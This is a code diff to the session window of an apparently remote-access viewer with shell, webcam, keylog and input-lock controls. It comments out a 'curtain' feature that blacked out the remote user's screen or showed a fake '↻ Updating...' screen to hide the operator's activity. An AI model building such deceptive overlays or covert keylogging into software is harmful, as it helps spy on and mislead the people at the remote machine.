@@ -18,7 +18,7 @@ from viewer.session_worker import AsyncSessionWorker
 from viewer.webcam_window import WebcamWindow
 from viewer.audio_player import AudioPlayer
 from viewer.settings_dialog import SettingsDialog
-from viewer.curtain_dialog import CurtainDialog
+# from viewer.curtain_dialog import CurtainDialog
 from viewer.connection_dialog import ConnectionDialog
 from viewer.shell_tab import ShellTab
 from viewer.pm_tab import PMTab
@@ -38,7 +38,7 @@ class SessionWindow(QMainWindow):
         self.resize(1280, 800)
         
         self.capture_settings = self.load_settings()
-        self.curtain_active = False
+        # self.curtain_active = False
         self.input_mode = "indirect"  # Default to Buffered
         self.closing = False
         self.mouse_enabled = False # Default to Mouse OFF
@@ -60,10 +60,10 @@ class SessionWindow(QMainWindow):
         self.canvas.input_signal.connect(self.handle_input)
         
         # Curtain Overlay
-        self.curtain_overlay = QLabel(self.canvas)
-        self.curtain_overlay.setStyleSheet("background-color: black;")
-        self.curtain_overlay.hide()
-        self.curtain_overlay.mousePressEvent = lambda e: self.disable_curtain()
+        # self.curtain_overlay = QLabel(self.canvas)
+        # self.curtain_overlay.setStyleSheet("background-color: black;")
+        # self.curtain_overlay.hide()
+        # self.curtain_overlay.mousePressEvent = lambda e: self.disable_curtain()
         
         # Tabs
         self.tabs = QTabWidget()
@@ -256,10 +256,10 @@ class SessionWindow(QMainWindow):
         self.act_keylog.triggered.connect(self.toggle_keylog)
         self.toolbar.addAction(self.act_keylog)
         
-        # Curtain
-        act_curtain = QAction("🔒 Curtain", self)
-        act_curtain.triggered.connect(self.show_curtain_dialog)
-        self.toolbar.addAction(act_curtain)
+        # # Curtain
+        # act_curtain = QAction("🔒 Curtain", self)
+        # act_curtain.triggered.connect(self.show_curtain_dialog)
+        # self.toolbar.addAction(act_curtain)
         
         # Block Input
         self.act_block = QAction("🚫 Lock Input", self, checkable=True)
@@ -506,42 +506,42 @@ class SessionWindow(QMainWindow):
             self.sys_player.stop()
             self.send_command(protocol.OP_SYS_AUDIO_STOP)
 
-    def show_curtain_dialog(self):
-        dialog = CurtainDialog(self)
-        dialog.curtain_selected.connect(self.activate_curtain)
-        dialog.exec()
+    # def show_curtain_dialog(self):
+    #     dialog = CurtainDialog(self)
+    #     dialog.curtain_selected.connect(self.activate_curtain)
+    #     dialog.exec()
     
-    def activate_curtain(self, curtain_type, data):
-        self.curtain_active = True
-        self.curtain_overlay.setGeometry(self.canvas.rect())
+    # def activate_curtain(self, curtain_type, data):
+    #     self.curtain_active = True
+    #     self.curtain_overlay.setGeometry(self.canvas.rect())
         
-        if curtain_type == "BLACK":
-            self.curtain_overlay.setStyleSheet("background-color: black;")
-            self.curtain_overlay.setPixmap(QPixmap())
-            # Send command to Agent to black out their screen
-            self.send_command(protocol.OP_CURTAIN_ON, b"BLACK")
-        elif curtain_type == "FAKE_UPDATE":
-            self.curtain_overlay.setText("↻ Updating...")
-            self.curtain_overlay.setAlignment(Qt.AlignmentFlag.AlignCenter)
-            self.curtain_overlay.setStyleSheet("background-color: #006dae; color: white; font-size: 24px;")
-            self.send_command(protocol.OP_CURTAIN_ON, b"FAKE_UPDATE")
-        else:  # IMAGE
-            pixmap = QPixmap(data)
-            self.curtain_overlay.setPixmap(pixmap.scaled(
-                self.canvas.size(), 
-                Qt.AspectRatioMode.KeepAspectRatioByExpanding
-            ))
-            # Send command to Agent (just black for now, can't send image)
-            self.send_command(protocol.OP_CURTAIN_ON, b"BLACK")
+    #     if curtain_type == "BLACK":
+    #         self.curtain_overlay.setStyleSheet("background-color: black;")
+    #         self.curtain_overlay.setPixmap(QPixmap())
+    #         # Send command to Agent to black out their screen
+    #         self.send_command(protocol.OP_CURTAIN_ON, b"BLACK")
+    #     elif curtain_type == "FAKE_UPDATE":
+    #         self.curtain_overlay.setText("↻ Updating...")
+    #         self.curtain_overlay.setAlignment(Qt.AlignmentFlag.AlignCenter)
+    #         self.curtain_overlay.setStyleSheet("background-color: #006dae; color: white; font-size: 24px;")
+    #         self.send_command(protocol.OP_CURTAIN_ON, b"FAKE_UPDATE")
+    #     else:  # IMAGE
+    #         pixmap = QPixmap(data)
+    #         self.curtain_overlay.setPixmap(pixmap.scaled(
+    #             self.canvas.size(), 
+    #             Qt.AspectRatioMode.KeepAspectRatioByExpanding
+    #         ))
+    #         # Send command to Agent (just black for now, can't send image)
+    #         self.send_command(protocol.OP_CURTAIN_ON, b"BLACK")
         
-        self.curtain_overlay.show()
-        self.curtain_overlay.raise_()
+    #     self.curtain_overlay.show()
+    #     self.curtain_overlay.raise_()
     
-    def disable_curtain(self):
-        self.curtain_active = False
-        self.curtain_overlay.hide()
-        # Send command to Agent to restore their screen
-        self.send_command(protocol.OP_CURTAIN_OFF)
+    # def disable_curtain(self):
+    #     self.curtain_active = False
+    #     self.curtain_overlay.hide()
+    #     # Send command to Agent to restore their screen
+    #     self.send_command(protocol.OP_CURTAIN_OFF)
     
     def show_settings_dialog(self):
         dialog = SettingsDialog(self, self.capture_settings)
@@ -703,8 +703,8 @@ class SessionWindow(QMainWindow):
     
     def resizeEvent(self, event):
         super().resizeEvent(event)
-        if self.curtain_active:
-            self.curtain_overlay.setGeometry(self.canvas.rect())
+        # if self.curtain_active:
+        #     self.curtain_overlay.setGeometry(self.canvas.rect())
     
     def closeEvent(self, event):
         self.closing = True
